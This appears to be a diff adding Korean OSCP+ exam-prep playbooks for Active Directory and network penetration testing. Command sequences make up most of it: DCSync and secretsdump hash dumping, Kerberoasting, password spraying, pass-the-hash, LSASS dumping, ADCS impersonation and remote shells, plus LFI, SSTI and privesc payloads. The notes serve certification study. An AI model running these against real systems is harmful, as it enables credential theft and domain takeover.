+
+### MAQ=0일 때 우회 (Shadow Credentials)
+
+```bash
+# 대상 컴퓨터에 key credential 추가 → 컴퓨터 TGT 획득
+pywhisker -d DOMAIN -u ME -H MEHASH --target 'TARGETPC$' --action add
+# 나온 pfx로 TGT 받고, 그 컴퓨터로 S4U 진행
+```
+
+---
+
+## 4. GenericAll on **Domain** → DCSync 권한 부여
+
+```bash
+# 나에게 복제 권한 부여
+bloodyAD --host DC -d DOMAIN -u ME -p PASS add dcsync ME
+# DCSync로 전체 해시 덤프
+impacket-secretsdump -just-dc 'DOMAIN/ME:PASS@DC'
+```
+
+---
+
+## 5. 트러블슈팅 (에러별 원인)
+
+| 에러                            | 의미                    | 해결                                                            |     |
+| ----------------------------- | --------------------- | ------------------------------------------------------------- | --- |
+| `No route to host` (113)      | 네트워크 도달 불가            | VPN(`ip a show tun0`) 확인, 타깃 IP 재확인(revert로 변경?), 박스 켜짐 확인    |     |
+| `Connection refused` (111)    | 포트는 닿는데 거부/이름 오해석     | `getent hosts DCHOST`로 IP 확인 → /etc/hosts 수정, `nmap -p445 DC` |     |
+| `KRB_AP_ERR_SKEW`             | 시계 차이 > 5분            | `sudo ntpdate DC` (매번 티켓 전에)                                  |     |
+| `KDC_ERR_S_PRINCIPAL_UNKNOWN` | SPN/호스트명 오류           | `-spn`은 IP 아닌 **호스트명**, /etc/hosts 철자 확인                      |     |
+| `KDC_ERR_PREAUTH_FAILED`      | 자격증명/해시 틀림            | 해시/비번 재확인                                                     |     |
+| addcomputer 실패                | MachineAccountQuota=0 | Shadow Credentials로 우회(3절)                                    |     |
+| `STATUS_ACCOUNT_RESTRICTION`  | 계정 제약(로그온 권한 등)       | psexec 대신 wmiexec/secretsdump 시도                              |     |
+
+### Kerberos 3대 필수 조건 (외워둘 것)
+
+1. **호스트명으로 접속** (IP 금지) → /etc/hosts 필요
+2. **시간 동기화** → `ntpdate DC`
+3. **KRB5CCNAME**이 올바른 ccache 파일을 가리킬 것
+
+---
+
+## 6. 재사용 체크리스트 (다른 박스에서)
+
+1. BloodHound에서 Owned → Tier Zero 경로 확인, 제어권 엣지 클릭 → **대상 유형 확인**
+2. 유형별 기법 선택 (0절 결정 트리)
+3. Computer 대상이면 → Kerberos 세팅(hosts+time) → RBCD 4단계
+4. 안 되면 → 5절 에러표로 진단
+5. 성공 → `secretsdump`로 도메인 해시 확보 / proof.txt
+
+> 도구: impacket 계열, [bloodyAD](https://github.com/CravateRouge/bloodyAD), [pywhisker](https://github.com/ShutdownRepo/pywhisker), [targetedKerberoast](https://github.com/ShutdownRepo/targetedKerberoast). BloodHound 엣지 클릭 → **Abuse Info** 탭에 항상 대상 맞춤 명령이 있음.
+
+**참고:** [The Hacker Recipes — RBCD](https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd) · [HackTricks — DACL Abuse](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/acl-persistence-abuse)
+
+
+# AD 세트 공략 플레이북 (한 장 요약)
+
+> 시험 직전에 이것부터 펴볼 것. 짝 문서: `ad_dacl_rbcd_playbook.md`(엣지→기법 상세)
+
+---
+
+## 핵심 사고 전환
+
+**AD는 직선이 아니라 루프다.** 헷갈리는 이유는 직선으로 생각해서다.
+
+OSCP+ AD 세트 = **assumed breach** → 항상 **저권한 계정 1개를 주고 시작**한다. 그러니 질문은 늘 하나: **"이 자격증명으로 뭘 할 수 있지?"**
+
+### 반복 루프 (모든 머신·계정에서)
+
+```
+① 이 신원으로 뭘 할 수 있나 열거
+② 새 자격증명 루팅
+③ 새 자격증명을 BloodHound / 스프레이에 다시 투입
+④ 반복 → DA 될 때까지
+```
+
+---
+
+## 고정 순서 (헷갈리면 이대로만)
+
+### 0. 준비 (항상 먼저)
+
+```bash
+echo "<DC_IP> dc.domain.local domain.local" | sudo tee -a /etc/hosts
+sudo ntpdate <DC_IP>          # Kerberos 시간동기 (안 하면 SKEW 에러)
+```
+
+### 1. 자격증명 검증 + 도메인 통째로 수집
+
+```bash
+nxc smb <DC_IP> -u USER -p PASS                    # 유효 확인 (+오타 확인)
+bloodhound-python -u USER -p PASS -d domain.local -ns <DC_IP> -c All --zip
+```
+
+→ BloodHound 업로드 → 내 계정 **Mark as Owned** → **"Shortest Paths from Owned"** 실행
+
+### 2. 빠른 승리(low-hanging) 3종 먼저
+
+```bash
+# Kerberoast
+impacket-GetUserSPNs domain.local/USER:PASS -dc-ip <DC> -request
+#   → hashcat -m 13100
+
+# AS-REP roast
+impacket-GetNPUsers domain.local/ -usersfile users.txt -no-pass -dc-ip <DC> -request
+#   → hashcat -m 18200
+
+# 비번 재사용 스프레이 (한 계정 비번을 전체 사용자에)
+nxc smb <서브넷>/24 -u users.txt -p 'FoundPass' --continue-on-success
+```
+
+크랙/성공 → **루프 ③**: 새 계정을 BloodHound·스프레이에 다시 투입
+
+### 3. BloodHound 경로를 "엣지 → 기법"으로 번역
+
+경로의 화살표를 하나씩 실행 (대상 유형으로 분기):
+
+|대상|기법|
+|---|---|
+|User|ForceChangePassword / Targeted Kerberoast|
+|Group|그룹에 나 추가 (DA면 즉시 승격)|
+|Computer|**RBCD** (상세는 rbcd 플레이북)|
+|Domain|DCSync|
+
+> 엣지 클릭 → **Abuse Info** 탭에 대상 맞춤 명령 있음
+
+### 4. 측면 이동 + 루팅 (새 머신마다 루프 반복)
+
+```bash
+evil-winrm -i <머신> -u USER -H <NThash>            # 이동
+psexec/wmiexec -hashes :NThash domain.local/USER@<머신>
+# 관리자면 반드시 루팅:
+impacket-secretsdump domain.local/USER@<머신> -hashes :NThash
+```
+
+→ 뽑은 해시를 **또 스프레이/BloodHound에 투입** (다음 머신의 연료)
+
+### 5. DC 장악
+
+```bash
+impacket-secretsdump -just-dc domain.local/USER@<DC>   # 도메인 전체 해시
+# 또는 티켓/PtH로 DC 셸
+impacket-psexec -k -no-pass dc.domain.local
+```
+
+→ `type C:\Users\Administrator\Desktop\proof.txt`
+
+---
+
+## 혼란 제거 3원칙
+
+1. **막히면 "지금 내 신원이 뭐고, 그걸로 뭘 할 수 있지?"만 물어라.** 도구를 랜덤으로 던지지 말고 BloodHound가 다음 엣지를 가리키게 하라.
+2. **새 자격증명은 무조건 BloodHound·스프레이에 재투입.** "막힘"의 대부분이 이 재투입 누락.
+3. **한 머신에서 admin 먹으면 반드시 secretsdump 루팅.** 거기서 나온 해시가 다음 머신의 열쇠.
+
+---
+
+## Kerberos 3대 필수 조건 (에러의 90%)
+
+1. **호스트명으로 접속** (IP 금지) → /etc/hosts 등록
+2. **시간 동기화** → `sudo ntpdate <DC>`
+3. **KRB5CCNAME**이 올바른 .ccache 지목
+
+에러표는 `ad_dacl_rbcd_playbook.md` 5절 참고.
+
+---
+
+## 자주 쓰는 자격증명 형태 (impacket 공통)
+
+```
+domain.local/USER:PASS                      # 평문
+domain.local/USER -hashes :NThash           # Pass-the-Hash
+-k -no-pass  (+ KRB5CCNAME)                  # Kerberos 티켓
+```
+
+**출처:** [OffSec — OSCP+ Exam with AD Preparation](https://help.offsec.com/hc/en-us/articles/4547917816468-OffSec-OSCP-Exam-with-AD-Preparation)
+
+
+실전 규칙 하나: **`svc_`로 시작하는 계정을 보면 세 가지를 떠올려라** — (1) Kerberoast 대상인가(SPN?), (2) SeImpersonate 있나(Potato?), (3) BloodHound에서 과도한 권한 가졌나. 이 세 각도가 서비스 계정을 도메인 장악으로 바꾸는 열쇠입니다.
+
+
+
+# OSCP 실전 반사 규칙 (트리거 → 반응)
+
+> 시험 중 "봤다 → 바로 이걸 한다"의 반사 모음. 막히면 이 파일부터 훑을 것. 짝 문서: `ad_set_공략_플레이북.md`, `ad_dacl_rbcd_playbook.md`, `hexstrike_tools_cheatsheet.md`
+
+---
+
+## 🔍 스캐닝·열거
+
+- **낯선 포트** → `-sV`로 배너 뽑고, **배너 문자열 그대로 검색** + `hacktricks <포트>`
+    - (예: 4505/4506 ZMTP → SaltStack CVE-2020-11651)
+- **포트가 거의 안 나옴** → UDP 스캔 했나? `sudo nmap -sU --top-ports 100` (SNMP 161, DNS 53)
+- **88 / 389 / 445 / 636 열림** → AD다. 도메인 이름부터 확보 → AD 흐름
+- **웹 디렉토리 안 나옴** → 다른 워드리스트로 재시도, `-s 200` 같은 과한 필터 확인
+    - "디렉토리 없음"이 아니라 "이 단어장엔 없음"
+- **모르는 서비스** → `searchsploit <서비스> <버전>`
+
+---
+
+## 🌐 웹
+
+- **IIS / aspx** → Windows 박스. php 버리고 `-x aspx,asp,html,txt`
+- **직원 이름·이메일 페이지** → username-anarchy → kerbrute → AS-REP roast
+- **파일 업로드** → 확장자 우회(.phtml/.php5/.phar), .htaccess 트릭, magic byte
+- **?file= / ?page= / ?include=** → LFI (`../../../../etc/passwd`, `php://filter`)
+- **입력창·검색** → SSTI(`{{7*7}}`=49?), 수동 SQLi (sqlmap 금지)
+- **URL에 id=숫자** → 수동 SQLi
+- **로그인 폼** → 기본 자격증명, 사용자명 열거, 약한 SQLi
+- **robots.txt / 소스보기 / 주석** → 숨은 경로·힌트
+
+---
+
+## 🐚 셸·초기침투
+
+- **셸 던지기 전** → OS부터 확인. Windows=nc.exe/PowerShell, Linux=bash
+- **셸 잡음** → 즉시 안정화: `python3 -c 'import pty;pty.spawn("/bin/bash")'` → Ctrl+Z → `stty raw -echo; fg`
+- **리버스셸 붙었는데 반응 없음** → staged/stageless 불일치. `shell_reverse_tcp`(stageless)로
+- **웹셸 있음** → `?cmd=whoami`로 먼저 실행 확인 → nc.exe 올려 안정적 셸
+
+---
+
+## ⬆️ Linux privesc
+
+- **셸 잡음** → 4종 먼저: `sudo -l` / `id` / `find / -perm -4000 2>/dev/null` / `getcap -r / 2>/dev/null`
+- **`sudo -l`에 뭔가** → 그 바이너리를 GTFOBins에서 검색
+- **낯선 SUID** → GTFOBins
+- **cron 작업** → 쓰기 가능한 스크립트 / PATH 하이재킹 / 와일드카드
+- **tar/zip 와일드카드 + sudo** → checkpoint 인젝션 (`chmod +s /bin/bash`, 비파괴적으로!)
+- **커널 오래됨(uname -a)** → 커널 익스플로잇 (최후수단)
+- **linpeas** → 놓친 벡터 자동 스캔
+
+---
+
+## 🪟 Windows privesc
+
+- **셸 잡음** → `whoami /priv` 먼저 (기본권한 버리고 juicy만)
+- **SeImpersonatePrivilege** → Potato (PrintSpoofer / GodPotato) → SYSTEM
+- **SeManageVolumePrivilege** → C: 쓰기권한 → DLL 하이재킹(PrintConfig/tzres) → SYSTEM
+- **SeBackup / SeRestore** → SAM·SYSTEM 하이브 복사 → secretsdump
+- **juicy 권한 없음** → 방향 전환: 설정파일·PS히스토리에서 **비번 사냥**
+    - `type C:\xampp\passwords.txt`, `cmdkey /list`, `ConsoleHost_history.txt`
+- **서비스 목록(`sc query`)** → unquoted service path, 약한 서비스 권한
+- **AlwaysInstallElevated** → 악성 msi 페이로드
+- **winPEAS** → juicy 권한·오설정 자동 하이라이트
+
+---
+
+## 🎯 Active Directory
+
+- **`svc_` 계정** → ① Kerberoast(SPN?) ② SeImpersonate(Potato?) ③ BloodHound 과권한?
+- **도메인 사용자 1개 얻음** → 즉시 BloodHound + Kerberoast + AS-REP 3종
+- **새 자격증명 얻을 때마다** → 무조건 BloodHound·스프레이 재투입 (핵심 루프)
+- **한 머신 admin 먹음** → `secretsdump`로 루팅 → 그 해시가 다음 머신 열쇠
+- **ntds.dit / SAM 얻음** → secretsdump → NT 해시로 PtH 스프레이
+- **GenericAll / WriteDacl 엣지** → 대상 유형으로 분기:
+    - User → 비번 리셋 / Targeted Kerberoast
+    - Group → 그룹에 나 추가 (DA면 즉시 승격)
+    - Computer → RBCD
+    - Domain → DCSync
+- **AddKeyCredentialLink** → Shadow Credentials (pywhisker/certipy)
+- **BloodHound 복잡한 그래프** → 제어 엣지가 가장 많이 모이는 노드가 왕관
+- **서브넷 두 개(192.168.x + 172.16.x)** → 내부망은 피벗(ligolo/chisel) 필요
+- **pre-auth 안 되는 계정** → AS-REP roast (hashcat 18200)
+
+---
+
+## 🔐 Kerberos (에러의 90%)
+
+- **`KRB_AP_ERR_SKEW`** → 시간 동기화 `sudo ntpdate DC`
+- **`KDC_ERR_S_PRINCIPAL_UNKNOWN`** → SPN은 IP 아닌 호스트명, /etc/hosts 확인
+- **Kerberos 인증은 항상** → 호스트명 접속 + /etc/hosts + KRB5CCNAME
+
+---
+
+## 🔑 크래킹·자격증명
+
+- **해시 얻음** → `hashid`로 종류 판별 → hashcat 모드
+    - NTLM 1000 / NetNTLMv2 5600 / Kerberoast 13100 / AS-REP 18200 / shadow 1800
+- **비번 하나 얻음** → 다른 계정·머신에 재사용 스프레이 (재사용 = AD 연료)
+- **스프레이 후보** → 계절+현재연도(`Spring2026!`), 회사명+연도, `Password1`, `Welcome1`
+- **스프레이 전** → 반드시 락아웃 정책 확인(`--pass-pol`), 계정당 1회씩 low&slow
+- **GPU 크래킹** → 느린 VM 대신 윈도우 호스트 GPU에서 hashcat
+
+---
+
+## 🔀 피벗팅
+
+- **내부망 IP(172.16.x 등) 안 닿음** → 피벗 필요, hosts 틀린 게 아님
+- **ligolo-ng** → SOCKS 불필요, tun 인터페이스로 내부망 직접 라우팅
+- **chisel** → SOCKS + proxychains
+- **No route to host** → 피벗 터널이 안 떠 있거나 VPN 끊김
+
+---
+
+## 🧠 마인드셋 (막혔을 때)
+
+- **막히면** → "지금 내 신원이 뭐고, 그걸로 뭘 할 수 있지?" (도구 랜덤 금지)
+- **한 머신 2시간 룰** → 넘기면 다음으로. 터널비전으로 진다
+- **낯선 것 = 버리지 말고 파고들기** → 익숙한 게 막다른 길, 뜬금없는 게 입구
+- **뭐든 얻으면** → "이걸 어디에 재사용하지?"를 항상 물어라
+- **매 단계 스크린샷 + 명령 기록** → 기술이 돼도 문서 없으면 점수 0
+- **시험 시간표** → AD(40점)부터 → 12~14h 내 70점 → 2~3h마다 휴식 → 최소 2h 검토 버퍼
+
+---
+
+## 🚫 규정 리마인더
+
+- 금지: sqlmap, commix, 자동 대량 취약점 스캐너 / 회색지대: Nuclei(회피)
+- Metasploit 모듈·Meterpreter: **머신 1대만** / msfvenom: 전 머신 OK
+- Burp: **Community만** (Pro 금지)
+
+
+# 자격증명 획득 시 해야 할 것 (전체 도구)
+
+> user:pass 또는 user:hash를 얻으면 "어디에 먹히나 + 뭘 캐나"를 전방위로. 목표별로 여러 도구 옵션. 변수: `USER` `PASS` `NThash` `TARGET`(IP) `DC`(DC IP) `DOMAIN`(예 domain.local) `SUBNET`(예 192.168.1.0/24) 해시면 대부분 `-p PASS`를 `-H NThash`(nxc) / `-hashes :NThash`(impacket)로 교체
+
+---
+
+## 0. 가장 먼저 — 검증 (이 자격증명 진짜 되나?)
+
+```bash
+# NetExec: 프로토콜별 유효성 (Pwn3d! = 로컬 admin)
+nxc smb TARGET -u USER -p PASS
+nxc winrm TARGET -u USER -p PASS
+nxc ldap DC -u USER -p PASS
+
+# kerbrute: KDC에 직접 검증 (락아웃 없이)
+kerbrute passwordspray -d DOMAIN --dc DC users.txt PASS
+
+# 도메인 계정인지 rpcclient로 빠르게
+rpcclient -U "DOMAIN/USER%PASS" TARGET -c "getusername"
+```
+
+---
+
+## 1. 스윕 — 어디에 먹히고 어디서 admin인가
+
+```bash
+# 프로토콜 전방위 (한 호스트)
+for p in smb winrm rdp ssh ldap mssql wmi; do nxc $p TARGET -u USER -p PASS; done
+
+# 전 호스트 (측면이동 지도)
+nxc smb SUBNET -u USER -p PASS --continue-on-success        # (Pwn3d!) 찾기
+nxc winrm SUBNET -u USER -p PASS                            # WinRM 셸 가능한 곳
+nxc rdp SUBNET -u USER -p PASS                              # RDP 가능한 곳
+```
+
+---
+
+## 2. SMB — 공유·파일·로컬해시
+
+```bash
+# 공유 + 권한
+nxc smb TARGET -u USER -p PASS --shares
+smbmap -H TARGET -u USER -p PASS -r
+smbclient -U "DOMAIN\USER%PASS" //TARGET/share
+
+# 파일 뒤지기 (비번·플래그 찾기)
+nxc smb TARGET -u USER -p PASS -M spider_plus
+smbmap -H TARGET -u USER -p PASS -R --depth 5
+
+# admin이면 로컬 자격증명 덤프
+nxc smb TARGET -u USER -p PASS --sam --lsa
+impacket-secretsdump DOMAIN/USER:PASS@TARGET               # 로컬 SAM/LSA
+```
+
+---
+
+## 3. AD 열거 — 도메인 구조·경로
+
+```bash
+# BloodHound 수집 (그래프 = 다음 수)
+bloodhound-python -d DOMAIN -u USER -p PASS -ns DC -c all --dns-tcp
+nxc ldap DC -u USER -p PASS --bloodhound --collection all --dns-server DC
+
+# 사용자·그룹·정책
+nxc ldap DC -u USER -p PASS --users --groups --pass-pol
+impacket-GetADUsers -all DOMAIN/USER:PASS -dc-ip DC
+windapsearch -d DOMAIN -u USER -p PASS --dc-ip DC -U       # 사용자 열거
+rpcclient -U "DOMAIN/USER%PASS" DC -c "enumdomusers"
+
+# 원시 LDAP 쿼리 (특정 속성 파기)
+ldapsearch -x -H ldap://DC -D "USER@DOMAIN" -w PASS -b "dc=domain,dc=local" \
+  "(&(objectClass=user))" sAMAccountName description memberOf
+
+# 유용한 것들
+nxc ldap DC -u USER -p PASS -M maq        # MachineAccountQuota (RBCD 가능?)
+nxc ldap DC -u USER -p PASS -M adcs       # ADCS 존재? (인증서 공격)
+nxc ldap DC -u USER -p PASS -M gmsa       # gMSA 비번
+```
+
+---
+
+## 4. Kerberos 공격 — 다른 계정 해시 확보
+
+```bash
+# Kerberoasting (SPN 계정 → 해시)
+impacket-GetUserSPNs DOMAIN/USER:PASS -dc-ip DC -request     # 원격
+nxc ldap DC -u USER -p PASS --kerberoasting kerb.txt
+#   → hashcat -m 13100
+
+# AS-REP Roasting (pre-auth 꺼진 계정)
+impacket-GetNPUsers DOMAIN/USER:PASS -dc-ip DC -request
+nxc ldap DC -u USER -p PASS --asreproast asrep.txt
+#   → hashcat -m 18200
+
+# 해시만 있을 때 → TGT부터 (Overpass-the-Hash)
+impacket-getTGT DOMAIN/USER -hashes :NThash -dc-ip DC
+export KRB5CCNAME=USER.ccache
+```
+
+---
+
+## 5. 자격증명 수확 — 이 계정으로 더 캐기
+
+```bash
+# GPP cpassword (SYSVOL) — 서비스 계정 비번 자주 나옴
+nxc smb TARGET -u USER -p PASS -M gpp_password
+nxc smb TARGET -u USER -p PASS -M gpp_autologin
+
+# LSASS 덤프 (admin 필요) → 메모리 속 크리덴셜
+nxc smb TARGET -u USER -p PASS -M lsassy
+nxc smb TARGET -u USER -p PASS -M nanodump
+
+# LAPS (로컬 admin 비번 로테이션)
+nxc smb TARGET -u USER -p PASS -M laps
+
+# DPAPI / 브라우저·저장 크리덴셜 (admin)
+impacket-secretsdump DOMAIN/USER:PASS@TARGET
+```
+
+---
+
+## 6. 셸 획득 — 어디서 admin이면
+
+```bash
+# WinRM (5985)
+evil-winrm -i TARGET -u USER -p PASS
+evil-winrm -i TARGET -u USER -H NThash             # PtH
+
+# SMB admin (445)
+impacket-psexec DOMAIN/USER:PASS@TARGET            # SYSTEM, 시끄러움
+impacket-wmiexec DOMAIN/USER:PASS@TARGET           # 조용함(135)
+impacket-smbexec DOMAIN/USER:PASS@TARGET
+impacket-atexec DOMAIN/USER:PASS@TARGET "whoami"
+
+# RDP (3389)
+xfreerdp /u:USER /p:PASS /v:TARGET /dynamic-resolution +clipboard
+
+# SSH (22) — 리눅스/재사용
+ssh USER@TARGET
+
+# MSSQL (1433) — xp_cmdshell로 RCE
+impacket-mssqlclient DOMAIN/USER:PASS@TARGET -windows-auth
+#   내부: enable_xp_cmdshell; xp_cmdshell whoami
+```
+
+---
+
+## 7. Pass-the-Hash / Pass-the-Ticket (해시·티켓만 있을 때)
+
+```bash
+# PtH (NThash로 인증)
+nxc smb TARGET -u USER -H NThash
+impacket-psexec DOMAIN/USER@TARGET -hashes :NThash
+evil-winrm -i TARGET -u USER -H NThash
+
+# PtT (Kerberos 티켓 재사용)
+export KRB5CCNAME=ticket.ccache
+impacket-psexec -k -no-pass TARGET.DOMAIN
+nxc smb TARGET -u USER -k
+```
+
+---
+
+## 8. ADCS (인증서 공격 — nxc -M adcs가 있다고 나오면)
+
+```bash
+certipy find -u USER@DOMAIN -p PASS -dc-ip DC -stdout -vulnerable
+# ESC1 등 취약 템플릿 발견 시 → 인증서 발급 → Administrator 사칭
+certipy req -u USER@DOMAIN -p PASS -ca CA_NAME -template TEMPLATE -upn administrator@DOMAIN
+```
+
+---
+
+## 9. 비번 재사용 반사 (놓치기 쉬운 금맥)
+
+- 같은 비번을 **다른 사용자명 전체**에 스프레이: `nxc smb SUBNET -u users.txt -p PASS --continue-on-success`
+- **username = password** 시도 (계정명과 같은 비번 흔함): `nxc smb TARGET -u users.txt -p users.txt --no-bruteforce`
+- 얻은 비번으로 **다른 서비스** 로그인: SSH, FTP, DB, 웹 관리자, RDP
+- 크랙한 서비스 계정 비번을 **도메인 계정**이 재사용하는지 확인
+
+---
+
+## 핵심 순서 (루프)
+
+1. **검증**(0) → 2. **스윕**(1): 어디 먹히나+어디 admin
+2. **SMB 루팅**(2) + **AD 열거·BloodHound**(3)
+3. **Kerberos 로스팅**(4) + **크리덴셜 수확**(5)
+4. admin이면 **셸·secretsdump**(6)
+5. 나온 자격증명 **다시 0번으로 재투입** ← 이 루프가 도메인 장악까지
+
+> 관련 문서: `ad_set_공략_플레이북.md`(전체 흐름), `실전_반사규칙.md`(트리거→반응)
+
+
+
+## 웹 페이지가 없을 때
+### 0. 먼저 — 정말 웹이 없나? (제일 흔한 실수)
+
+기본 nmap은 상위 1000포트만 봅니다. **웹이 비표준 포트(8080, 8000, 8443, 3000, 5000 등)에 있을 수 있어요.** 전체 포트 + UDP를 다시 확인:
+
+bash
+
+```bash
+nmap -p- --min-rate 5000 <TARGET> -oN allports.txt      # 전체 TCP
+sudo nmap -sU --top-ports 100 <TARGET> -oN udp.txt      # UDP (SNMP 놓치지 말 것)
+nmap -sC -sV -p <열린포트들> <TARGET>                    # 정밀
+```
+
+높은 포트에 http가 뜨면 그게 웹입니다. 정말 없으면 아래로.
+
+### 1. 열린 서비스를 하나씩 — "익명/기본/널" 마인드셋
+
+웹이 없으면 **있는 서비스**를 판다. 각 포트별로:
+
+**SMB (139/445)** — 웹 없을 때 1순위 foothold
+
+bash
+
+```bash
+enum4linux-ng -A <TARGET>
+smbmap -H <TARGET>                    # 널 세션 공유
+smbclient -L //<TARGET> -N
+nxc smb <TARGET> -u '' -p '' --shares
+```
+
+읽기 가능한 공유·사용자·비번 파일을 찾음. 구버전이면 EternalBlue 등 확인.
+
+**AD 포트 (88/389/636/3268)** — 이게 열렸으면 **DC다** → AD 경로
+
+bash
+
+```bash
+ldapsearch -x -H ldap://<TARGET> -s base namingcontexts   # 익명 바인드
+ldapsearch -x -H ldap://<TARGET> -b "dc=domain,dc=local"  # 도메인 덤프
+# 사용자 리스트 만들어 AS-REP roast (자격증명 없이!)
+impacket-GetNPUsers domain.local/ -usersfile users.txt -no-pass -dc-ip <TARGET>
+kerbrute userenum -d domain.local --dc <TARGET> users.txt
+```
+
+**SNMP (161/UDP)** — UDP 스캔 안 하면 놓침, 정보 대량 유출
+
+bash
+
+```bash
+snmpwalk -v2c -c public <TARGET>
+onesixtyone -c community-strings.txt <TARGET>
+```
+
+**FTP (21)**
+
+bash
+
+```bash
+ftp <TARGET>          # anonymous/anonymous
+nmap --script ftp-anon -p21 <TARGET>
+```
+
+**RPC (135/139)**
+
+bash
+
+```bash
+rpcclient -U "" -N <TARGET>    # → enumdomusers, querydispinfo
+```
+
+**MSSQL(1433)/MySQL(3306)** — 기본/약한 자격증명
+
+bash
+
+```bash
+impacket-mssqlclient sa:''@<TARGET>          # sa 빈 비번
+mysql -h <TARGET> -u root -p
+```
+
+**SMTP(25)** — 사용자 열거 / **DNS(53)** — 존 트랜스퍼 / **NFS(2049)** — `showmount -e`
+
+### 2. 모든 서비스 → 버전 → searchsploit
+
+웹이 없을 땐 **서비스 버전 취약점**이 foothold인 경우가 많습니다:
+
+bash
+
+```bash
+searchsploit <서비스명> <버전>
+```
+
+낯선 서비스/포트는 예전 SaltStack(4505/ZMTP) 때처럼 **배너 문자열 그대로 검색 + `hacktricks <포트>`**.
+
+---
+
+### 핵심 우선순위 (웹 없을 때)
+
+1. **전체 포트 + UDP 재스캔** (웹이 8080에 숨었나, SNMP 있나)
+2. **SMB** (널 세션/공유/사용자) — 가장 흔한 대체 foothold
+3. **AD 포트 열렸으면 → DC → 사용자 열거 → AS-REP roast/스프레이**
+4. **SNMP(UDP)** 확인
+5. **모든 서비스 버전 → searchsploit**
+6. 어디서나 **익명/기본/널 접근** 먼저 시도
